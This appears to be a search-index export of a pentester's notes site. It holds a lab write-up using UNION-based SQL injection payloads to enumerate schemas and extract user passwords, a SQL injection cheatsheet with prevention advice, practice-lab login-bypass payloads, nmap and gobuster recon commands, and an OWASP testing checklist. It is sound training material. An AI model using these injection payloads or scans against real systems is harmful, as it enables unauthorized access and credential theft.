SQL injection attack, listing the database contents on non-Oracle databases <p>Lab Instructions</p> <p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p> <p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p> <p>To solve the lab, log in as the\u00a0<code>administrator</code>\u00a0user.</p> <p>Same sort of eCommerce site here as before. </p> <p>Since the point off this lab is to extract information from the information schema, I'm going to try this payload first: <code>' UNION SELECT null,schema_name from information_schema.schemata-- -</code></p> <p>After sending that, we get the following output:</p> <p></p> <p>I probably could have narrowed that down a bit by appending <code>where schema_name='pg_catalog'</code>, but oh well. Now we need to enumerate the tables. We can use <code>' UNION SELECT null,table_name from information_schema.tables-- -</code> to do that.</p> <p>Getting the user table</p> <p></p> <p>So now we can enumerate columns from that table. </p> <p>Sending <code>' UNION SELECT null,column_name from information_schema.columns where table_name='users_ihlozl'-- -</code> gives the following results:</p> <p></p> <p>Now that we have the column names we can start trying to extract some data. I used the following query to get the usernames and passwords: <code>' UNION SELECT null,username_ewecsv || ' ' || password_ikgqwk FROM users_ybsfde-- -</code>.</p> <p></p> <p>Aaaaand...done.</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#advanced-exploitation","title":"Advanced Exploitation","text":"<p>These attacks depend on excessive database user privileges.</p> <ul> <li> <p>File System Access: Using database functions like <code>LOAD_FILE()</code> to read sensitive files from the server (e.g., <code>/etc/passwd</code>).</p> </li> <li> <p>Remote Code Execution (RCE): Using database features like <code>xp_cmdshell</code> (MS-SQL) or user-defined functions to execute operating system commands on the server.</p> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#prevention-methods","title":"Prevention Methods","text":""},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#parameterized-queries","title":"Parameterized Queries","text":"<ul> <li> <p>Also known as: Prepared Statements.</p> </li> <li> <p>Concept: This method strictly separates the SQL query logic from the user-supplied data. The query structure is sent and compiled first, then the data is sent separately and safely bound to the query.</p> </li> <li> <p>Why it works: User input is always treated as data, never as executable code. The <code>' OR '1'='1'</code> payload fails because the database literally looks for a value with that string, which doesn't exist.</p> </li> </ul>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#defense-in-depth-strategy","title":"Defense-in-Depth Strategy","text":"<p>Using multiple layers of security.</p> <ol> <li> <p>Input Validation: Check if user input is in the expected format (e.g., is it an integer?) before processing it. Use allow-listing (only accepting known-good formats).</p> </li> <li> <p>Principle of Least Privilege: The application's database account should only have the absolute minimum permissions needed to function. This limits the damage if an injection occurs.</p> </li> <li> <p>Web Application Firewall (WAF): A device or service that inspects traffic and blocks requests that match known-bad attack signatures. A good layer, but not a substitute for secure code.</p> </li> </ol>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#advanced-topics","title":"Advanced Topics","text":""},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#second-order-sqli","title":"Second-Order SQLi","text":"<p>A two-step attack where a malicious payload is first safely stored in the database, only to be executed later when a different, vulnerable function retrieves and uses that data insecurely.</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#out-of-band-oob-sqli","title":"Out-of-Band (OOB) SQLi","text":"<p>An exfiltration method where the attacker forces the database to make an external network request (e.g., DNS or HTTP) to a server they control, sending data within that request.</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#automation-sqlmap","title":"Automation (SQLMap)","text":"<p>A powerful open-source tool that automates the entire process of detecting, exploiting, and exfiltrating data via SQL injection.</p>"},{"location":"references/cheatsheets/injection-attacks/SQL-injection/index.html#other-labs","title":"Other Labs","text":"YesWeHack Dojo - SQL Injection <p>Lab 1 - Simple Login Bypass</p> <p></p> <p>Payload:</p> <pre><code>pass' or '1'='1\n</code></pre> <p></p> <p></p> <p>Lab 2: First Exfiltration</p> <p>This level has a hint as follows </p> <p>\"<code>UNION</code>\u00a0can be used to combine the results from different queries.\"</p> <p></p> <p>Sending \"admin\" gives us the email address for the admin user:</p> <p></p> <p>Now we can try using a <code>UNION</code> to extract the password.</p> <p>This took a little bit of tinkering, but I eventually got the following payload working:</p> <pre><code>admin%' UNION SELECT null,password FROM users WHERE email LIKE '%admin%'-- -\n</code></pre> <p></p>"},{"location":"references/methodologies/infrastructure/external-network-pentesting.html","title":"External Network Testing","text":""},{"location":"references/methodologies/infrastructure/external-network-pentesting.html#recon","title":"Recon","text":""},{"location":"references/methodologies/infrastructure/external-network-pentesting.html#basic-lookups","title":"Basic Lookups","text":"<p>Dig: <pre><code>dig {TARGET}\n</code></pre></p> <p>WHOIS: <pre><code>whois {TARGET}\n</code></pre></p> <p>Nmap Quick Scan: <pre><code>nmap -sS -T4 {TARGET}\n</code></pre></p> <p>Nmap Full Scan: <pre><code>nmap -sS -sV -O -A -p- {TARGET}\n</code></pre></p>"},{"location":"references/methodologies/infrastructure/external-network-pentesting.html#directory-discovery","title":"Directory Discovery","text":"<p>Gobuster: <pre><code>gobuster dir -u https://{TARGET} -w `fzf-wordlists`\n</code></pre></p> <p>Dirb: <pre><code>dirb http://{TARGET}\n</code></pre></p>"},{"location":"references/methodologies/infrastructure/external-network-pentesting.html#subdomain-enumeration","title":"Subdomain Enumeration","text":"<p>Subfinder: <pre><code>subfinder -d {TARGET}\n</code></pre></p> <p>Amass: <pre><code>amass enum -d {TARGET}\n</code></pre></p>"},{"location":"references/methodologies/infrastructure/internal-network-pentesting.html","title":"Internal Network Pentesting","text":""},{"location":"references/methodologies/web-apps/owasp-wstg.html","title":"OWASP WSTG","text":""},{"location":"references/methodologies/web-apps/owasp-wstg.html#information-gathering","title":"Information Gathering","text":"<ul> <li> Conduct Search Engine Discovery Reconnaissance for Information Leakage WSTG-INFO-01 </li> <li> Fingerprint Web Server WSTG-INFO-02</li> <li> Review Webserver Metafiles for Information Leakage WSTG-INFO-03</li> <li> Enumerate Applications on Webserver WSTG-INFO-04</li> <li> Review Web Page Content for Information Leakage WSTG-INFO-05</li> <li> Identify Application Entry Points WSTG-INFO-06</li> <li> Map Execution Paths Through Application WSTG-INFO-07</li> <li> Fingerprint Web Application Framework WSTG-INFO-08</li> <li> Fingerprint Web Application WSTG-INFO-09</li> <li> Map Application Architecture WSTG-INFO-10</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#configuration-and-deployment-management-testing","title":"Configuration and Deployment Management Testing","text":"<ul> <li> Test Network Infrastructure Configuration WSTG-CONF-01</li> <li> Test Application Platform Configuration WSTG-CONF-02</li> <li> Test File Extensions Handling for Sensitive Information WSTG-CONF-03</li> <li> Review Old Backup and Unreferenced Files for Sensitive Information WSTG-CONF-04</li> <li> Enumerate Infrastructure and Application Admin Interfaces WSTG-CONF-05</li> <li> Test HTTP Methods WSTG-CONF-06</li> <li> Test HTTP Strict Transport Security WSTG-CONF-07</li> <li> Test RIA Cross Domain Policy WSTG-CONF-08</li> <li> Test File Permission WSTG-CONF-09</li> <li> Test for Subdomain Takeover WSTG-CONF-10</li> <li> Test Cloud Storage WSTG-CONF-11</li> <li> Testing for Content Security Policy WSTG-CONF-12</li> <li> Test Path Confusion WSTG-CONF-13</li> <li> Test Other HTTP Security Header Misconfigurations WSTG-CONF-14</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#identity-management-testing","title":"Identity Management Testing","text":"<ul> <li> Test Role Definitions WSTG-IDNT-01</li> <li> Test User Registration Process WSTG-IDNT-02</li> <li> Test Account Provisioning Process WSTG-IDNT-03</li> <li> Testing for Account Enumeration and Guessable User Account WSTG-IDNT-04</li> <li> Testing for Weak or Unenforced Username Policy WSTG-IDNT-05</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Testing for Credentials Transported over an Encrypted Channel WSTG-ATHN-01</li> <li> Testing for Default Credentials WSTG-ATHN-02</li> <li> Testing for Weak Lock Out Mechanism WSTG-ATHN-03</li> <li> Testing for Bypassing Authentication Schema WSTG-ATHN-04</li> <li> Testing for Vulnerable Remember Password WSTG-ATHN-05</li> <li> Testing for Browser Cache Weaknesses WSTG-ATHN-06</li> <li> Testing for Weak Authentication Methods WSTG-ATHN-07</li> <li> Testing for Weak Security Question Answer WSTG-ATHN-08</li> <li> Testing for Weak Password Change or Reset Functionalities WSTG-ATHN-09</li> <li> Testing for Weaker Authentication in Alternative Channel WSTG-ATHN-10</li> <li> Testing Multi-Factor Authentication (MFA) WSTG-ATHN-11</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#authorization-testing","title":"Authorization Testing","text":"<ul> <li> Testing Directory Traversal File Include WSTG-ATHZ-01</li> <li> Testing for Bypassing Authorization Schema WSTG-ATHZ-02</li> <li> Testing for Privilege Escalation WSTG-ATHZ-03</li> <li> Testing for Insecure Direct Object References WSTG-ATHZ-04</li> <li> Testing for OAuth Weaknesses WSTG-ATHZ-05</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#session-management-testing","title":"Session Management Testing","text":"<ul> <li> Testing for Session Management Schema WSTG-SESS-01</li> <li> Testing for Cookies Attributes WSTG-SESS-02</li> <li> Testing for Session Fixation WSTG-SESS-03</li> <li> Testing for Exposed Session Variables WSTG-SESS-04</li> <li> Testing for Cross Site Request Forgery WSTG-SESS-05</li> <li> Testing for Logout Functionality WSTG-SESS-06</li> <li> Testing Session Timeout WSTG-SESS-07</li> <li> Testing for Session Puzzling WSTG-SESS-08</li> <li> Testing for Session Hijacking WSTG-SESS-09</li> <li> Testing JSON Web Tokens WSTG-SESS-10</li> <li> Testing for Concurrent Sessions WSTG-SESS-11</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#input-validation-testing","title":"Input Validation Testing","text":"<ul> <li> Testing for Reflected Cross-Site Scripting WSTG-INPV-01</li> <li> Testing for Stored Cross Site Scripting WSTG-INPV-02</li> <li> Testing for HTTP Verb Tampering WSTG-INPV-03</li> <li> Testing for HTTP Parameter Pollution WSTG-INPV-04</li> <li> Testing for SQLi WSTG-INPV-05</li> <li> Testing for LDAP Injection WSTG-INPV-06</li> <li> Testing for XML Injection WSTG-INPV-07</li> <li> Testing for SSI Injection WSTG-INPV-08</li> <li> Testing for XPath Injection WSTG-INPV-09</li> <li> Testing for IMAP SMTP Injection WSTG-INPV-10</li> <li> Testing for Code Injection WSTG-INPV-11</li> <li> Testing for Command Injection WSTG-INPV-12</li> <li> Testing for Buffer Overflow WSTG-INPV-13</li> <li> Testing for Format String Injection WSTG-INPV-13</li> <li> Testing for Incubated Vulnerability WSTG-INPV-14</li> <li> Testing for HTTP Splitting Smuggling WSTG-INPV-15</li> <li> Testing for HTTP Incoming Requests WSTG-INPV-16</li> <li> Testing for Host Header Injection WSTG-INPV-17</li> <li> Testing for Server-side Template Injection WSTG-INPV-18</li> <li> Testing for Server Side Request Forgery WSTG-INPV-19</li> <li> Testing for Mass Assignment WSTG-INPV-20</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#testing-for-error-handling","title":"Testing for Error Handling","text":"<ul> <li> Testing for Improper Error Handling WSTG-ERRH-01</li> <li> Testing for Stack Traces WSTG-ERRH-02</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#testing-for-weak-cryptography","title":"Testing for Weak Cryptography","text":"<ul> <li> Testing for Weak Transport Layer Security WSTG-CRYP-01</li> <li> Testing for Padding Oracle WSTG-CRYP-02</li> <li> Testing for Sensitive Information Sent via Unencrypted Channels WSTG-CRYP-03</li> <li> Testing for Weak Encryption WSTG-CRYP-04</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#business-logic-testing","title":"Business Logic Testing","text":"<ul> <li> Test Business Logic Data Validation WSTG-BUSL-01</li> <li> Test Ability to Forge Requests WSTG-BUSL-02</li> <li> Test Integrity Checks WSTG-BUSL-03</li> <li> Test for Process Timing WSTG-BUSL-04</li> <li> Test Number of Times a Function Can Be Used Limits WSTG-BUSL-05</li> <li> Testing for the Circumvention of Work Flows WSTG-BUSL-06</li> <li> Test Defenses Against Application Misuse WSTG-BUSL-07</li> <li> Test Upload of Unexpected File Types WSTG-BUSL-08</li> <li> Test Upload of Malicious Files WSTG-BUSL-09</li> <li> Test Payment Functionality WSTG-BUSL-10</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#client-side-testing","title":"Client Side Testing","text":"<ul> <li> Testing for DOM-Based Cross Site Scripting WSTG-CLNT-01</li> <li> Testing for JavaScript Execution WSTG-CLNT-02</li> <li> Testing for HTML Injection WSTG-CLNT-03</li> <li> Testing for Client-side URL Redirect WSTG-CLNT-04</li> <li> Testing for CSS Injection WSTG-CLNT-05</li> <li> Testing for Client-side Resource Manipulation WSTG-CLNT-06</li> <li> Testing Cross Origin Resource Sharing WSTG-CLNT-07</li> <li> Testing for Cross Site Flashing WSTG-CLNT-08</li> <li> Testing for Clickjacking WSTG-CLNT-09</li> <li> Testing WebSockets WSTG-CLNT-10</li> <li> Testing Web Messaging WSTG-CLNT-11</li> <li> Testing Browser Storage WSTG-CLNT-12</li> <li> Testing for Cross Site Script Inclusion WSTG-CLNT-13</li> <li> Testing for Reverse Tabnabbing WSTG-CLNT-14</li> </ul>"},{"location":"references/methodologies/web-apps/owasp-wstg.html#api-testing","title":"API Testing","text":"<ul> <li> API Reconnaissance WSTG-APIT-01</li> <li> Testing GraphQL WSTG-APIT-99</li> </ul>"},{"location":"blog/archive/2024.html","title":"2024","text":""},{"location":"blog/category/writeups.html","title":"writeups","text":""},{"location":"blog/category/vulnlab.html","title":"vulnlab","text":""},{"location":"blog/category/tryhackme.html","title":"tryhackme","text":""}]}